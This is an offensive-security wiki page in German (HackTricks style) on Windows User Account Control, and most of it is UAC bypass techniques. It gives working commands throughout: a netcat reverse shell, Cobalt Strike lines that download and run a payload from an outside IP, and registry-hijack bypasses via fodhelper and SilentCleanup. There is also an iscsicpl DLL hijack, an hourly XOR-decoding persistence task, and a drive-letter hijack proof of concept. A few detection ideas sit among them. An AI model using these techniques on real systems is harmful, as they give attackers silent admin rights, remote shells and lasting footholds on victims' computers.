# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsabfrage für Aktionen mit erhöhten Rechten** ermöglicht. Anwendungen verfügen über unterschiedliche `integrity`-Stufen, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die das **System potenziell kompromittieren könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, sofern ein Administrator diesen Anwendungen bzw. Aufgaben nicht ausdrücklich Administratorzugriff auf das System zur Ausführung gewährt. Es handelt sich um eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, jedoch nicht als Sicherheitsgrenze betrachtet wird.

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiv ist, erhält ein Administratorkonto 2 Tokens: ein Standardbenutzer-Token für reguläre Aktionen mit mittlerer Integrität und eines mit den Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) beschreibt ausführlich, wie UAC funktioniert, und umfasst den Anmeldevorgang, die Benutzererfahrung und die UAC-Architektur. Administratoren können mithilfe von Sicherheitsrichtlinien konfigurieren, wie UAC auf lokaler Ebene für ihre Organisation funktioniert (mit secpol.msc), oder die Konfiguration über Group Policy Objects (GPO) in einer Active-Directory-Domänenumgebung vornehmen und verteilen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Für UAC können 10 Group-Policy-Einstellungen festgelegt werden. Die folgende Tabelle enthält zusätzliche Informationen:

| Group-Policy-Einstellung                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsabfrage für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Abfrage von Anmeldeinformationen auf dem sicheren Desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; standardmäßig in Enterprise deaktiviert)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** ("secpol.msc" auf den meisten Systemen) sind standardmäßig so konfiguriert, dass sie **Nicht-Administratoren an der Installation von Software hindern**. Das bedeutet, dass ein Nicht-Administrator selbst dann, wenn er das Installationsprogramm für deine Software herunterladen kann, dieses ohne ein Administratorkonto nicht ausführen kann.

### Registry Keys, um UAC zur Abfrage einer Erhöhung zu zwingen

Als Standardbenutzer ohne Administratorrechte kannst du sicherstellen, dass das "Standardkonto" bei UAC **zur Eingabe von Anmeldeinformationen aufgefordert wird**, wenn es bestimmte Aktionen auszuführen versucht. Dafür müssen bestimmte **Registry Keys** geändert werden, wofür du Administratorrechte benötigst, sofern es keinen **UAC bypass** gibt oder der Angreifer bereits als Administrator angemeldet ist.

Selbst wenn sich der Benutzer in der Gruppe **Administratoren** befindet, zwingen diese Änderungen den Benutzer dazu, seine **Kontodaten erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies nur nützlich, wenn du bereits über ein Token mit erhöhten Rechten, einen UAC bypass oder eine Fehlkonfiguration verfügst, die das Ändern dieser Keys ermöglicht; andernfalls wird der Registry-Schreibvorgang selbst blockiert.**

Die Registry Keys und Einträge, die du ändern musst, lauten wie folgt (mit ihren Standardwerten in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool für lokale Sicherheitsrichtlinien durchgeführt werden. Nach der Änderung wird der Benutzer bei administrativen Vorgängen aufgefordert, seine Anmeldeinformationen erneut einzugeben.

### Hinweis

**User Account Control ist keine Sicherheitsgrenze.** Daher können Standardbenutzer ihre Konten nicht verlassen und Administratorrechte erlangen, ohne einen Exploit zur lokalen Rechteausweitung zu verwenden.

### Einen Benutzer nach "vollständigem Computerzugriff" fragen
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dies wird erreicht, indem der Browser mit einem Token mit niedriger Integritätsstufe ausgeführt wird. Wenn der Browser versucht, auf Daten in der Zone mit niedriger Integritätsstufe zuzugreifen, prüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft dabei, Remote-Code-Execution-Angriffe daran zu hindern, auf sensible Daten im System zuzugreifen.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Privilegien des Benutzers enthält. Privilegien sind als Kombination aus den Rechten und Fähigkeiten eines Benutzers definiert. Das Token enthält außerdem eine Liste der Anmeldedaten des Benutzers. Dabei handelt es sich um Anmeldedaten, die verwendet werden, um den Benutzer gegenüber dem Computer und Ressourcen im Netzwerk zu authentifizieren.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, muss der **`AutoAdminLogon`-Registrierungsschlüssel** gesetzt werden. Dies ist für Kiosk-Umgebungen oder Testzwecke nützlich. Verwende dies nur auf sicheren Systemen, da das Passwort dadurch in der Registry offengelegt wird.

Setze die folgenden Schlüssel mit dem Registry Editor oder `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Um zum normalen Anmeldeverhalten zurückzukehren, setze `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachte, dass der UAC bypass unkompliziert ist, wenn du grafischen Zugriff auf das Opfer hast, da du einfach auf „Yes“ klicken kannst, sobald die UAC-Eingabeaufforderung erscheint.

Der UAC bypass ist in folgender Situation erforderlich: **UAC ist aktiviert, dein Prozess läuft in einem Kontext mit mittlerer Integritätsstufe und dein Benutzer gehört zur Administratorengruppe**.

Es ist wichtig zu erwähnen, dass es **wesentlich schwieriger ist, UAC zu umgehen, wenn die höchste Sicherheitsstufe (Always) aktiviert ist, als bei einer der anderen Stufen (Default).**

### Fast triage from a medium-integrity shell

Bevor du einen bypass ausprobierst, bestätige, dass du dich in der richtigen Situation befindest, und ordne den Host-Build bekannten funktionierenden Methoden zu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktische Hinweise:
- Wenn `EnableLUA=0` ist, benötigen Sie keinen bypass: Jeder Admin-Token kann direkt hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das gängige Szenario für auto-elevate- / COM-basierte bypasses.
- `Always Notify` erhöht die Hürde, aber Sie sollten dennoch den exakten Build testen, anstatt von einem Fehlschlag auszugehen: UACME listet weiterhin einige mit `AlwaysNotify compatible` gekennzeichnete Methoden für moderne Windows-Builds.

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), können Sie eine **reverse shell mit Admin-Rechten** (hohe Integritätsstufe) ausführen, etwa mit:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass mit token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** einfacher UAC-„bypass“ (vollständiger Zugriff auf das Dateisystem)

Wenn du eine shell mit einem Benutzer hast, der Mitglied der Gruppe „Administrators“ ist, kannst du die über SMB freigegebene **C$**-Freigabe lokal als neues Laufwerk einbinden und erhältst **Zugriff auf alles innerhalb des Dateisystems** (einschließlich des Home-Ordners des Administrators).

> [!WARNING]
> **Anscheinend funktioniert dieser Trick nicht mehr**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit Cobalt Strike

Die Cobalt-Strike-Techniken funktionieren nur, wenn UAC nicht auf die maximale Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **Umgehen** der **UAC**.

### Erhöhte COM-Schnittstellen (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-Objekte stellen auch in modernen Builds weiterhin eine praktische UAC-Angriffsfläche dar. `ICMLuaUtil` wird von UACME weiterhin als auf aktuellen Windows-Zweigen funktionierend geführt, und offensive Tools passen `CMSTPLUA` weiterhin an, indem sie einen interaktiven Desktop-Prozess, eine 64-Bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.

Praktische Hinweise:
- Bevorzuge einen **64-Bit**-Prozess in der **interaktiven Sitzung** des Benutzers (üblicherweise `explorer.exe` oder einen untergeordneten Prozess davon).
- Wenn eine direkte Shell fehlschlägt, versuche es erneut über eine BOF-/UACME-Implementierung anstelle eines naiven `CreateProcess`-Wrappers.
- Rechne damit, dass die Ausführung des Child-Prozesses in einem **separaten privilegierten Prozess** erfolgt. Viele BOFs erhöhen nicht den aktuellen Beacon-Prozess direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Bypass-Exploits

[**UACME** ](https://github.com/hfiref0x/UACME), eine **Sammlung** verschiedener UAC-Bypass-Exploits. Beachte, dass du **UACME mit Visual Studio oder msbuild kompilieren** musst. Die Kompilierung erstellt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`). Du musst wissen, **welche davon du benötigst.**\
Du solltest **vorsichtig sein**, da einige Bypasses **andere Programme anzeigen**, die den **Benutzer** darauf **aufmerksam machen**, dass etwas geschieht.

UACME enthält die **Build-Version, ab der die jeweilige Technik funktioniert**. Du kannst nach einer Technik suchen, die deine Versionen betrifft:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Außerdem erhältst du auf Grundlage [dieser](https://en.wikipedia.org/wiki/Windows_10_version_history) Seite anhand der Build-Versionen das Windows-Release `1607`.

Ein praxisnaher Workflow besteht darin, zunächst **den Host-Build zu bewerten** und erst danach die passende Methode auszuführen:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden, was nützlich ist, um veraltete PoCs zügig auszusortieren.
- `UACME` bleibt der beste öffentliche Katalog, um einen Bypass einem präzisen Build zuzuordnen. Neuere Releases haben neue Methoden hinzugefügt und bestehende gegen **Windows 11 25H2** erneut getestet. Daher sollte die README bzw. die Hinweise zum Release geprüft werden, bevor angenommen wird, dass ein alter Blogbeitrag noch unverändert anwendbar ist.

### UAC Bypass – fodhelper.exe (Registry-Hijacking)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird unter modernen Windows-Versionen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den unten aufgeführten benutzerbezogenen Registry-Pfad ab, ohne das Verb `DelegateExecute` zu validieren. Wird dort ein Befehl hinterlegt, kann ein Prozess mit Medium Integrity (Benutzer ist Mitglied der Gruppe Administrators) ohne UAC-Eingabeaufforderung einen Prozess mit High Integrity starten.

Vom Prozess fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Gruppe Administrators ist und die UAC-Ebene auf den Standardwert bzw. eine lockere Einstellung gesetzt ist (nicht auf „Always Notify“ mit zusätzlichen Einschränkungen).
- Verwende den Pfad `sysnative`, um eine 64-Bit-PowerShell aus einem 32-Bit-Prozess unter 64-Bit-Windows zu starten.
- Der Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Stealth UIs, die Eingaben anfordern.

#### CurVer/extension hijack variant (nur HKCU)

Aktuelle Samples, die `fodhelper.exe` missbrauchen, vermeiden `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerspezifischen `CurVer`-Wert um. Die auto-elevated Binary löst den Handler weiterhin unter `HKCU` auf, sodass zum Anlegen der Schlüssel kein Admin-Token erforderlich ist:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nach der Rechteerhöhung **deaktiviert Malware häufig zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie weitere Maßnahmen zur **Umgehung von Schutzmechanismen** durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und stellt die Persistenz wieder her, um mit hoher Integrität ausgeführt zu werden. Ein typischer Persistenz-Task speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf dem Datenträger und dekodiert und führt es jede Stunde im Arbeitsspeicher aus:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Diese Variante bereinigt weiterhin den **`dropper`** und lässt nur die gestagten Payloads zurück. Dadurch hängt die Erkennung von der Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausschlüssen oder geplanten Tasks ab, die PowerShell im Speicher entschlüsseln.

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Berechtigungen und erweitert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Erweiterung auf einen beliebigen Befehl umleiten und ohne Zustimmungsdialog eine hohe Integrität erreichen. Diese Methode ist auf aktuellen Builds weiterhin einen Test wert, da UACME die Technik weiterhin aktiv hält und das aktuelle Issue-Tracking zeigt, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen an der Maskierung benötigt.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Wenn die Aufgabe den Pfad bei diesem Build in Anführungszeichen setzt, wiederhole den Vorgang mit einem Payload, der mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige `HKCU\Environment\windir` nach dem Test immer.

#### More UAC bypass

Viele klassische UAC bypasses, die UI-Abläufe, COM-Objekte oder Desktop-Interaktion missbrauchen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein Dienst, der in **Session 0** läuft, reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **process**, dessen **Session**-Wert gleich **1** ist:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) zeigen lassen und diese Erweiterung unserem Payload zuordnen - More UAC bypass: Dies kann mit einer meterpreter-Sitzung erreicht werden. Zu einem Prozess migrieren, dessen Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass mit GUI

Wenn du Zugriff auf eine **GUI** hast, kannst du die UAC-Abfrage einfach **bestätigen**, sobald sie erscheint; du benötigst also keinen technischen bypass. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Einschränkungen von UAC zu umgehen.

Wenn du außerdem eine GUI-Sitzung erhältst, die jemand verwendet hat (möglicherweise über RDP), werden dort **einige Tools als Administrator ausgeführt**, über die du beispielsweise direkt ein **cmd** **als Administrator ausführen** kannst, ohne dass erneut eine UAC-Abfrage erscheint, wie bei [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das kann etwas **unauffälliger** sein.

### Noisy brute-force UAC bypass

Wenn dir die Geräuschentwicklung egal ist, kannst du jederzeit **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das so lange nach erhöhten Berechtigungen **fragt, bis der Benutzer die Anfrage akzeptiert**.

### Dein eigener bypass – Grundlegende UAC-bypass-Methodik

Wenn du dir **UACME** ansiehst, wirst du feststellen, dass **viele UAC bypasses DLL hijacking missbrauchen** (häufig, indem eine Binary mit erhöhten Rechten eine vom Angreifer kontrollierte DLL aus einem beschreibbaren Pfad lädt). [Lies dies, um zu erfahren, wie du eine DLL-hijacking-Schwachstelle findest](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde eine Binary, die **autoelevate** verwendet (überprüfe, dass sie bei der Ausführung mit einem hohen Integrity Level läuft).
2. Suche mit Procmon nach Ereignissen mit "**NAME NOT FOUND**", die für **DLL Hijacking** anfällig sein können.
3. Wahrscheinlich musst du die DLL in einige **geschützte Pfade** (zum Beispiel C:\Windows\System32) **schreiben**, für die du keine Schreibberechtigungen besitzt. Du kannst dies umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Damit kann der Inhalt einer CAB-Datei in geschützte Pfade extrahiert werden (da dieses Tool mit einem hohen Integrity Level ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **Script** vor, das deine DLL in den geschützten Pfad kopiert und die anfällige und autoelevated Binary ausführt.

### Eine weitere UAC-bypass-Technik

Dabei wird überprüft, ob eine **autoElevated Binary** versucht, den **Namen/Pfad** einer **Binary** oder eines **Befehls**, der **ausgeführt** werden soll, aus der **Registry** zu **lesen** (besonders interessant ist dies, wenn die Binary diese Informationen innerhalb von **HKCU** sucht).

### UAC bypass über `SysWOW64\iscsicpl.exe` + DLL hijack über die Benutzer-`PATH`

Die 32-Bit-`C:\Windows\SysWOW64\iscsicpl.exe` ist eine **auto-elevated** Binary, die dazu missbraucht werden kann, `iscsiexe.dll` anhand der Suchreihenfolge zu laden. Wenn du eine schädliche `iscsiexe.dll` in einem **vom Benutzer beschreibbaren** Ordner platzieren und anschließend die `PATH`-Variable des aktuellen Benutzers ändern kannst (zum Beispiel über `HKCU\Environment\Path`), sodass dieser Ordner durchsucht wird, lädt Windows möglicherweise die Angreifer-DLL in den Prozess der erhöht ausgeführten `iscsicpl.exe`, **ohne eine UAC-Abfrage anzuzeigen**.

Praktische Hinweise:
- Dies ist nützlich, wenn der aktuelle Benutzer Mitglied der **Administrators** ist, aber aufgrund von UAC mit **Medium Integrity** ausgeführt wird.
- Die Kopie in **SysWOW64** ist für diesen bypass relevant. Behandle die Kopie in **System32** als separate Binary und überprüfe ihr Verhalten unabhängig.
- Das grundlegende Prinzip ist eine Kombination aus **auto-elevation** und **DLL search-order hijacking**. Daher ist derselbe ProcMon-Workflow wie bei anderen UAC bypasses nützlich, um das Laden der fehlenden DLL zu validieren.

Minimaler Ablauf:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection-Ideen:
- Auf `reg add` / Registry-Schreibvorgänge nach `HKCU\Environment\Path` alarmieren, wenn unmittelbar danach `C:\Windows\SysWOW64\iscsicpl.exe` ausgeführt wird.
- Nach `iscsiexe.dll` an **benutzerkontrollierten** Speicherorten wie `%TEMP%` oder `%LOCALAPPDATA%\Microsoft\WindowsApps` suchen.
- Starts von `iscsicpl.exe` mit unerwarteten Child-Prozessen oder DLL-Ladevorgängen außerhalb der normalen Windows-Verzeichnisse korrelieren.

### Neuere Forschung, die separat geprüft werden sollte

Einige Chains nach 2024 sehen nicht mehr wie die klassischen Registry-Hijacks unter `HKCU\Software\Classes` aus. Beispielsweise kann Activation-Context-Cache-Poisoning ein **Drive-Remapping** und eine **DLL-Redirection** verketten, um über vertrauenswürdige UI- / Auto-Elevated-Binaries wie `ctfmon.exe` und spätere Ziele wie `fodhelper.exe` von mittlerer zu hoher Integrität zu gelangen. Statt den umfangreichen PoC hier zu duplizieren, sollten die kompakten Payload-Beispiele unter folgendem Link geprüft werden:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2): Drive-Letter-Hijack über eine DOS-Device-Map pro Logon-Session

Für die vollständige Angriffsfläche von `RAiLaunchAdminProcess` / UIAccess unter Windows 11 25H2 siehe die dedizierte Seite:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ verwendet Shadow-Admin-Token mit sitzungsspezifischen `\Sessions\0\DosDevices/<LUID>`-Maps. Das Verzeichnis wird von `SeGetTokenDeviceMap` beim ersten Auflösen von `\??` verzögert erstellt. Wenn der Angreifer das Shadow-Admin-Token nur auf **SecurityIdentification** impersoniert, wird das Verzeichnis mit dem Angreifer als **Owner** erstellt (es übernimmt `CREATOR OWNER`), wodurch Drive-Letter-Links erstellt werden können, die Vorrang vor `\GLOBAL??` haben.

**Schritte:**

1. Rufe aus einer Sitzung mit niedrigen Rechten `RAiProcessRunOnce` auf, um ein Shadow-Admin-`runonce.exe` ohne Eingabeaufforderung zu starten.
2. Dupliziere dessen primäres Token als **Identification**-Token und impersoniere es, während `\??` geöffnet wird, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter der Kontrolle des Angreifers zu erzwingen.
3. Erstelle dort einen `C:`-Symlink, der auf vom Angreifer kontrollierten Speicher zeigt. Nachfolgende Dateisystemzugriffe in dieser Sitzung lösen `C:` auf den Angreifer-Pfad auf und ermöglichen so einen DLL-/Datei-Hijack ohne Eingabeaufforderung.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referenzen
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Funktionsweise von User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
